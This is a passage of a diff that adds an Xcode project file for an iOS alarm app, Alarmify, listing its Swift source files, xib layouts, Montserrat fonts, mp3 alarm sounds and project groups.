@@ -1,0 +1,989 @@
+// !$*UTF8*$!
+{
+	archiveVersion = 1;
+	classes = {
+	};
+	objectVersion = 77;
+	objects = {
+
+/* Begin PBXBuildFile section */
+		886493772F0BBFF5006D2FDC /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8864936E2F0BBFF5006D2FDC /* Assets.xcassets */; };
+		886493792F0BBFF5006D2FDC /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 886493712F0BBFF5006D2FDC /* LaunchScreen.storyboard */; };
+		8864937A2F0BBFF5006D2FDC /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 886493732F0BBFF5006D2FDC /* Main.storyboard */; };
+		8864937B2F0BBFF5006D2FDC /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8864936D2F0BBFF5006D2FDC /* AppDelegate.swift */; };
+		8864937D2F0BBFF5006D2FDC /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 886493752F0BBFF5006D2FDC /* ViewController.swift */; };
+		BC2A41472F0BD2360080DFFD /* AlaramTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC2A41452F0BD2360080DFFD /* AlaramTVCell.swift */; };
+		BC2A41482F0BD2360080DFFD /* AlaramTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC2A41462F0BD2360080DFFD /* AlaramTVCell.xib */; };
+		BC2A414D2F0BDCE80080DFFD /* AddNewAlarmVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC2A414B2F0BDCE80080DFFD /* AddNewAlarmVC.swift */; };
+		BC2A414E2F0BDCE80080DFFD /* AddNewAlarmVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC2A414C2F0BDCE80080DFFD /* AddNewAlarmVC.xib */; };
+		BC4259692F0BC1BD00C15DA6 /* VideoPicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259632F0BC1BD00C15DA6 /* VideoPicker.swift */; };
+		BC42596A2F0BC1BD00C15DA6 /* String+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC42595C2F0BC1BD00C15DA6 /* String+Extention.swift */; };
+		BC42596B2F0BC1BD00C15DA6 /* ImagePicker.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259612F0BC1BD00C15DA6 /* ImagePicker.swift */; };
+		BC42596C2F0BC1BD00C15DA6 /* UIFont+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC42595E2F0BC1BD00C15DA6 /* UIFont+Extention.swift */; };
+		BC42596D2F0BC1BD00C15DA6 /* AppUtilites.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259672F0BC1BD00C15DA6 /* AppUtilites.swift */; };
+		BC42596E2F0BC1BD00C15DA6 /* UIColor+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC42595D2F0BC1BD00C15DA6 /* UIColor+Extention.swift */; };
+		BC42596F2F0BC1BD00C15DA6 /* AppConstants.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259662F0BC1BD00C15DA6 /* AppConstants.swift */; };
+		BC4259702F0BC1BD00C15DA6 /* PickerViewViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259622F0BC1BD00C15DA6 /* PickerViewViewController.swift */; };
+		BC4259712F0BC1BD00C15DA6 /* UITextField+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC42595F2F0BC1BD00C15DA6 /* UITextField+Extention.swift */; };
+		BC4259722F0BC1BD00C15DA6 /* AGDesignable.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259652F0BC1BD00C15DA6 /* AGDesignable.swift */; };
+		BC42598A2F0BC23600C15DA6 /* Montserrat-ExtraLightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC42597E2F0BC23600C15DA6 /* Montserrat-ExtraLightItalic.ttf */; };
+		BC42598B2F0BC23600C15DA6 /* Montserrat-Medium.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259822F0BC23600C15DA6 /* Montserrat-Medium.ttf */; };
+		BC42598C2F0BC23600C15DA6 /* Montserrat-Light.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259802F0BC23600C15DA6 /* Montserrat-Light.ttf */; };
+		BC42598D2F0BC23600C15DA6 /* Montserrat-Black.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259772F0BC23600C15DA6 /* Montserrat-Black.ttf */; };
+		BC42598E2F0BC23600C15DA6 /* Montserrat-BoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC42597A2F0BC23600C15DA6 /* Montserrat-BoldItalic.ttf */; };
+		BC42598F2F0BC23600C15DA6 /* Montserrat-Italic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC42597F2F0BC23600C15DA6 /* Montserrat-Italic.ttf */; };
+		BC4259902F0BC23600C15DA6 /* Montserrat-SemiBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259852F0BC23600C15DA6 /* Montserrat-SemiBold.ttf */; };
+		BC4259912F0BC23600C15DA6 /* Montserrat-ExtraBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC42597C2F0BC23600C15DA6 /* Montserrat-ExtraBoldItalic.ttf */; };
+		BC4259922F0BC23600C15DA6 /* Montserrat-Regular.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259842F0BC23600C15DA6 /* Montserrat-Regular.ttf */; };
+		BC4259932F0BC23600C15DA6 /* Montserrat-ThinItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259882F0BC23600C15DA6 /* Montserrat-ThinItalic.ttf */; };
+		BC4259942F0BC23600C15DA6 /* Montserrat-BlackItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259782F0BC23600C15DA6 /* Montserrat-BlackItalic.ttf */; };
+		BC4259952F0BC23600C15DA6 /* Montserrat-LightItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259812F0BC23600C15DA6 /* Montserrat-LightItalic.ttf */; };
+		BC4259962F0BC23600C15DA6 /* Montserrat-Thin.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259872F0BC23600C15DA6 /* Montserrat-Thin.ttf */; };
+		BC4259972F0BC23600C15DA6 /* Montserrat-ExtraBold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC42597B2F0BC23600C15DA6 /* Montserrat-ExtraBold.ttf */; };
+		BC4259982F0BC23600C15DA6 /* Montserrat-Bold.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259792F0BC23600C15DA6 /* Montserrat-Bold.ttf */; };
+		BC4259992F0BC23600C15DA6 /* Montserrat-ExtraLight.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC42597D2F0BC23600C15DA6 /* Montserrat-ExtraLight.ttf */; };
+		BC42599A2F0BC23600C15DA6 /* Montserrat-MediumItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259832F0BC23600C15DA6 /* Montserrat-MediumItalic.ttf */; };
+		BC42599B2F0BC23600C15DA6 /* Montserrat-SemiBoldItalic.ttf in Resources */ = {isa = PBXBuildFile; fileRef = BC4259862F0BC23600C15DA6 /* Montserrat-SemiBoldItalic.ttf */; };
+		BC4259A42F0BC4A400C15DA6 /* OnboardingVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259A22F0BC4A400C15DA6 /* OnboardingVC.swift */; };
+		BC4259A52F0BC4A400C15DA6 /* OnboardingVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4259A32F0BC4A400C15DA6 /* OnboardingVC.xib */; };
+		BC4259AA2F0BC87000C15DA6 /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC4259A82F0BC87000C15DA6 /* HomeVC.swift */; };
+		BC4259AB2F0BC87000C15DA6 /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC4259A92F0BC87000C15DA6 /* HomeVC.xib */; };
+		BC81EB712F0CC68E00114F1E /* DayCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC81EB6F2F0CC68E00114F1E /* DayCVCell.swift */; };
+		BC81EB722F0CC68E00114F1E /* DayCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC81EB702F0CC68E00114F1E /* DayCVCell.xib */; };
+		BC81EB752F0CC7C800114F1E /* AddNewViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC81EB742F0CC7C800114F1E /* AddNewViewModel.swift */; };
+		BC81EB812F0CCB4D00114F1E /* UIView+Extention.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC81EB802F0CCB4D00114F1E /* UIView+Extention.swift */; };
+		BC81EB872F0CD5D100114F1E /* AlarmSoundVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC81EB852F0CD5D100114F1E /* AlarmSoundVC.swift */; };
+		BC81EB882F0CD5D100114F1E /* AlarmSoundVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC81EB862F0CD5D100114F1E /* AlarmSoundVC.xib */; };
+		BC81EB8B2F0CDAB100114F1E /* AlarmSoundViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC81EB8A2F0CDAB100114F1E /* AlarmSoundViewModel.swift */; };
+		BC81EB902F0CDE1D00114F1E /* SoundListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BC81EB8E2F0CDE1D00114F1E /* SoundListTVCell.swift */; };
+		BC81EB912F0CDE1D00114F1E /* SoundListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BC81EB8F2F0CDE1D00114F1E /* SoundListTVCell.xib */; };
+		BCBF73B72F0CEC3F004F134A /* AlramSound.json in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73B52F0CEC3F004F134A /* AlramSound.json */; };
+		BCBF73C62F0CECBA004F134A /* ios_18_journey.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73BD2F0CECBA004F134A /* ios_18_journey.mp3 */; };
+		BCBF73C72F0CECBA004F134A /* kettle_iphone.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73C02F0CECBA004F134A /* kettle_iphone.mp3 */; };
+		BCBF73C82F0CECBA004F134A /* ios_26_little_bird.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73BF2F0CECBA004F134A /* ios_26_little_bird.mp3 */; };
+		BCBF73C92F0CECBA004F134A /* chalet_iphone.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73BA2F0CECBA004F134A /* chalet_iphone.mp3 */; };
+		BCBF73CA2F0CECBA004F134A /* dollop_iphone.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73BC2F0CECBA004F134A /* dollop_iphone.mp3 */; };
+		BCBF73CB2F0CECBA004F134A /* sencha_ios.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73C42F0CECBA004F134A /* sencha_ios.mp3 */; };
+		BCBF73CC2F0CECBA004F134A /* canopy_iphone.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73B92F0CECBA004F134A /* canopy_iphone.mp3 */; };
+		BCBF73CD2F0CECBA004F134A /* ios_18_milky_way.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73BE2F0CECBA004F134A /* ios_18_milky_way.mp3 */; };
+		BCBF73CE2F0CECBA004F134A /* opening_iphone.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73C22F0CECBA004F134A /* opening_iphone.mp3 */; };
+		BCBF73CF2F0CECBA004F134A /* mercury_iphone.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73C12F0CECBA004F134A /* mercury_iphone.mp3 */; };
+		BCBF73D02F0CECBA004F134A /* departure.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73BB2F0CECBA004F134A /* departure.mp3 */; };
+		BCBF73D12F0CECBA004F134A /* radial.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73C32F0CECBA004F134A /* radial.mp3 */; };
+		BCBF73D22F0CECBA004F134A /* arpeggio.mp3 in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73B82F0CECBA004F134A /* arpeggio.mp3 */; };
+		BCBF73E62F0CFC30004F134A /* ShakeChallengeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBF73E22F0CFC30004F134A /* ShakeChallengeVC.swift */; };
+		BCBF73E72F0CFC30004F134A /* MathChallengeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBF73DA2F0CFC30004F134A /* MathChallengeVC.swift */; };
+		BCBF73E82F0CFC30004F134A /* BarcodeChallengeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBF73D62F0CFC30004F134A /* BarcodeChallengeVC.swift */; };
+		BCBF73E92F0CFC30004F134A /* BarcodeListTblViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBF73D32F0CFC30004F134A /* BarcodeListTblViewCell.swift */; };
+		BCBF73EA2F0CFC30004F134A /* RewriteChallengeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBF73DE2F0CFC30004F134A /* RewriteChallengeVC.swift */; };
+		BCBF73EB2F0CFC30004F134A /* ShakeChallengeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73E32F0CFC30004F134A /* ShakeChallengeVC.xib */; };
+		BCBF73EC2F0CFC30004F134A /* RewriteChallengeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73DF2F0CFC30004F134A /* RewriteChallengeVC.xib */; };
+		BCBF73ED2F0CFC30004F134A /* BarcodeChallengeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73D72F0CFC30004F134A /* BarcodeChallengeVC.xib */; };
+		BCBF73EE2F0CFC30004F134A /* MathChallengeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73DB2F0CFC30004F134A /* MathChallengeVC.xib */; };
+		BCBF73EF2F0CFC30004F134A /* BarcodeListTblViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73D42F0CFC30004F134A /* BarcodeListTblViewCell.xib */; };
+		BCBF73F42F0D033D004F134A /* SnoozeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCBF73F32F0D033D004F134A /* SnoozeVC.xib */; };
+		BCBF73F52F0D033D004F134A /* SnoozeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = BCBF73F22F0D033D004F134A /* SnoozeVC.swift */; };
+/* End PBXBuildFile section */
+
+/* Begin PBXFileReference section */
+		886493552F0BBFEC006D2FDC /* Alarmify.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Alarmify.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		8864936D2F0BBFF5006D2FDC /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
+		8864936E2F0BBFF5006D2FDC /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		8864936F2F0BBFF5006D2FDC /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		886493702F0BBFF5006D2FDC /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		886493722F0BBFF5006D2FDC /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
+		886493752F0BBFF5006D2FDC /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		BC2A41452F0BD2360080DFFD /* AlaramTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlaramTVCell.swift; sourceTree = "<group>"; };
+		BC2A41462F0BD2360080DFFD /* AlaramTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AlaramTVCell.xib; sourceTree = "<group>"; };
+		BC2A414B2F0BDCE80080DFFD /* AddNewAlarmVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewAlarmVC.swift; sourceTree = "<group>"; };
+		BC2A414C2F0BDCE80080DFFD /* AddNewAlarmVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AddNewAlarmVC.xib; sourceTree = "<group>"; };
+		BC42595C2F0BC1BD00C15DA6 /* String+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+Extention.swift"; sourceTree = "<group>"; };
+		BC42595D2F0BC1BD00C15DA6 /* UIColor+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIColor+Extention.swift"; sourceTree = "<group>"; };
+		BC42595E2F0BC1BD00C15DA6 /* UIFont+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIFont+Extention.swift"; sourceTree = "<group>"; };
+		BC42595F2F0BC1BD00C15DA6 /* UITextField+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UITextField+Extention.swift"; sourceTree = "<group>"; };
+		BC4259612F0BC1BD00C15DA6 /* ImagePicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ImagePicker.swift; sourceTree = "<group>"; };
+		BC4259622F0BC1BD00C15DA6 /* PickerViewViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PickerViewViewController.swift; sourceTree = "<group>"; };
+		BC4259632F0BC1BD00C15DA6 /* VideoPicker.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoPicker.swift; sourceTree = "<group>"; };
+		BC4259652F0BC1BD00C15DA6 /* AGDesignable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AGDesignable.swift; sourceTree = "<group>"; };
+		BC4259662F0BC1BD00C15DA6 /* AppConstants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConstants.swift; sourceTree = "<group>"; };
+		BC4259672F0BC1BD00C15DA6 /* AppUtilites.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppUtilites.swift; sourceTree = "<group>"; };
+		BC4259772F0BC23600C15DA6 /* Montserrat-Black.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Black.ttf"; sourceTree = "<group>"; };
+		BC4259782F0BC23600C15DA6 /* Montserrat-BlackItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-BlackItalic.ttf"; sourceTree = "<group>"; };
+		BC4259792F0BC23600C15DA6 /* Montserrat-Bold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Bold.ttf"; sourceTree = "<group>"; };
+		BC42597A2F0BC23600C15DA6 /* Montserrat-BoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-BoldItalic.ttf"; sourceTree = "<group>"; };
+		BC42597B2F0BC23600C15DA6 /* Montserrat-ExtraBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraBold.ttf"; sourceTree = "<group>"; };
+		BC42597C2F0BC23600C15DA6 /* Montserrat-ExtraBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraBoldItalic.ttf"; sourceTree = "<group>"; };
+		BC42597D2F0BC23600C15DA6 /* Montserrat-ExtraLight.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraLight.ttf"; sourceTree = "<group>"; };
+		BC42597E2F0BC23600C15DA6 /* Montserrat-ExtraLightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ExtraLightItalic.ttf"; sourceTree = "<group>"; };
+		BC42597F2F0BC23600C15DA6 /* Montserrat-Italic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Italic.ttf"; sourceTree = "<group>"; };
+		BC4259802F0BC23600C15DA6 /* Montserrat-Light.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Light.ttf"; sourceTree = "<group>"; };
+		BC4259812F0BC23600C15DA6 /* Montserrat-LightItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-LightItalic.ttf"; sourceTree = "<group>"; };
+		BC4259822F0BC23600C15DA6 /* Montserrat-Medium.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Medium.ttf"; sourceTree = "<group>"; };
+		BC4259832F0BC23600C15DA6 /* Montserrat-MediumItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-MediumItalic.ttf"; sourceTree = "<group>"; };
+		BC4259842F0BC23600C15DA6 /* Montserrat-Regular.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Regular.ttf"; sourceTree = "<group>"; };
+		BC4259852F0BC23600C15DA6 /* Montserrat-SemiBold.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-SemiBold.ttf"; sourceTree = "<group>"; };
+		BC4259862F0BC23600C15DA6 /* Montserrat-SemiBoldItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-SemiBoldItalic.ttf"; sourceTree = "<group>"; };
+		BC4259872F0BC23600C15DA6 /* Montserrat-Thin.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-Thin.ttf"; sourceTree = "<group>"; };
+		BC4259882F0BC23600C15DA6 /* Montserrat-ThinItalic.ttf */ = {isa = PBXFileReference; lastKnownFileType = file; path = "Montserrat-ThinItalic.ttf"; sourceTree = "<group>"; };
+		BC4259A22F0BC4A400C15DA6 /* OnboardingVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OnboardingVC.swift; sourceTree = "<group>"; };
+		BC4259A32F0BC4A400C15DA6 /* OnboardingVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OnboardingVC.xib; sourceTree = "<group>"; };
+		BC4259A82F0BC87000C15DA6 /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
+		BC4259A92F0BC87000C15DA6 /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
+		BC81EB6F2F0CC68E00114F1E /* DayCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayCVCell.swift; sourceTree = "<group>"; };
+		BC81EB702F0CC68E00114F1E /* DayCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = DayCVCell.xib; sourceTree = "<group>"; };
+		BC81EB742F0CC7C800114F1E /* AddNewViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewViewModel.swift; sourceTree = "<group>"; };
+		BC81EB802F0CCB4D00114F1E /* UIView+Extention.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extention.swift"; sourceTree = "<group>"; };
+		BC81EB852F0CD5D100114F1E /* AlarmSoundVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlarmSoundVC.swift; sourceTree = "<group>"; };
+		BC81EB862F0CD5D100114F1E /* AlarmSoundVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AlarmSoundVC.xib; sourceTree = "<group>"; };
+		BC81EB8A2F0CDAB100114F1E /* AlarmSoundViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AlarmSoundViewModel.swift; sourceTree = "<group>"; };
+		BC81EB8E2F0CDE1D00114F1E /* SoundListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SoundListTVCell.swift; sourceTree = "<group>"; };
+		BC81EB8F2F0CDE1D00114F1E /* SoundListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SoundListTVCell.xib; sourceTree = "<group>"; };
+		BCBF73B62F0CEC3F004F134A /* en */ = {isa = PBXFileReference; lastKnownFileType = text.json; name = en; path = en.lproj/AlramSound.json; sourceTree = "<group>"; };
+		BCBF73B82F0CECBA004F134A /* arpeggio.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = arpeggio.mp3; sourceTree = "<group>"; };
+		BCBF73B92F0CECBA004F134A /* canopy_iphone.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = canopy_iphone.mp3; sourceTree = "<group>"; };
+		BCBF73BA2F0CECBA004F134A /* chalet_iphone.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = chalet_iphone.mp3; sourceTree = "<group>"; };
+		BCBF73BB2F0CECBA004F134A /* departure.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = departure.mp3; sourceTree = "<group>"; };
+		BCBF73BC2F0CECBA004F134A /* dollop_iphone.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = dollop_iphone.mp3; sourceTree = "<group>"; };
+		BCBF73BD2F0CECBA004F134A /* ios_18_journey.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = ios_18_journey.mp3; sourceTree = "<group>"; };
+		BCBF73BE2F0CECBA004F134A /* ios_18_milky_way.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = ios_18_milky_way.mp3; sourceTree = "<group>"; };
+		BCBF73BF2F0CECBA004F134A /* ios_26_little_bird.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = ios_26_little_bird.mp3; sourceTree = "<group>"; };
+		BCBF73C02F0CECBA004F134A /* kettle_iphone.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = kettle_iphone.mp3; sourceTree = "<group>"; };
+		BCBF73C12F0CECBA004F134A /* mercury_iphone.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = mercury_iphone.mp3; sourceTree = "<group>"; };
+		BCBF73C22F0CECBA004F134A /* opening_iphone.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = opening_iphone.mp3; sourceTree = "<group>"; };
+		BCBF73C32F0CECBA004F134A /* radial.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = radial.mp3; sourceTree = "<group>"; };
+		BCBF73C42F0CECBA004F134A /* sencha_ios.mp3 */ = {isa = PBXFileReference; lastKnownFileType = audio.mp3; path = sencha_ios.mp3; sourceTree = "<group>"; };
+		BCBF73D32F0CFC30004F134A /* BarcodeListTblViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BarcodeListTblViewCell.swift; sourceTree = "<group>"; };
+		BCBF73D42F0CFC30004F134A /* BarcodeListTblViewCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BarcodeListTblViewCell.xib; sourceTree = "<group>"; };
+		BCBF73D62F0CFC30004F134A /* BarcodeChallengeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BarcodeChallengeVC.swift; sourceTree = "<group>"; };
+		BCBF73D72F0CFC30004F134A /* BarcodeChallengeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = BarcodeChallengeVC.xib; sourceTree = "<group>"; };
+		BCBF73DA2F0CFC30004F134A /* MathChallengeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MathChallengeVC.swift; sourceTree = "<group>"; };
+		BCBF73DB2F0CFC30004F134A /* MathChallengeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MathChallengeVC.xib; sourceTree = "<group>"; };
+		BCBF73DE2F0CFC30004F134A /* RewriteChallengeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RewriteChallengeVC.swift; sourceTree = "<group>"; };
+		BCBF73DF2F0CFC30004F134A /* RewriteChallengeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = RewriteChallengeVC.xib; sourceTree = "<group>"; };
+		BCBF73E22F0CFC30004F134A /* ShakeChallengeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ShakeChallengeVC.swift; sourceTree = "<group>"; };
+		BCBF73E32F0CFC30004F134A /* ShakeChallengeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ShakeChallengeVC.xib; sourceTree = "<group>"; };
+		BCBF73F22F0D033D004F134A /* SnoozeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SnoozeVC.swift; sourceTree = "<group>"; };
+		BCBF73F32F0D033D004F134A /* SnoozeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SnoozeVC.xib; sourceTree = "<group>"; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		886493522F0BBFEC006D2FDC /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		8864934C2F0BBFEC006D2FDC = {
+			isa = PBXGroup;
+			children = (
+				886493762F0BBFF5006D2FDC /* Alarmify */,
+				886493562F0BBFEC006D2FDC /* Products */,
+			);
+			sourceTree = "<group>";
+		};
+		886493562F0BBFEC006D2FDC /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				886493552F0BBFEC006D2FDC /* Alarmify.app */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
